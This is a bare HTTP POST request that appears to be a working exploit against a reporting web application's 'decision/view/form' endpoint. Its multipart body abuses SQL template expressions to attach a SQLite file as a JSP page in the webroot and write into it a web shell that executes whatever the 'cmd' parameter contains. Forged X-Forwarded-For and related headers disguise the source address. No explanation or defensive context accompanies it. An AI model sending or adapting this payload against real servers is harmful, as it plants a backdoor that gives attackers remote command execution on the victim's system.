POST /webroot/decision/view/form?op=fr_attach&cmd=aH_upload HTTP/2
Host: 
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For: 103.146.179.104
X-Originating-Ip: 103.146.179.104
X-Remote-Ip: 103.146.179.104
X-Remote-Addr: 103.146.179.104
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary9nWtz5kBq3EiN5Jp
Content-Length: 456

------WebKitFormBoundary9nWtz5kBq3EiN5Jp
Content-Disposition: form-data; name="file"; filename="a"
Content-Type: text/xml

${SQL("FRDemo","	ATTACH DATABASE '../webapps/webroot/ctc.jsp' as psox;",1,1)}
${SQL("FRDemo","	CREATE TABLE psox.exp(data text);",1,1)}
${SQL("FRDemo","	INSERT INTO psox.exp(data) VALUES ('<%out.println(\"hallo\");Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>');",1,1)}
------WebKitFormBoundary9nWtz5kBq3EiN5Jp--
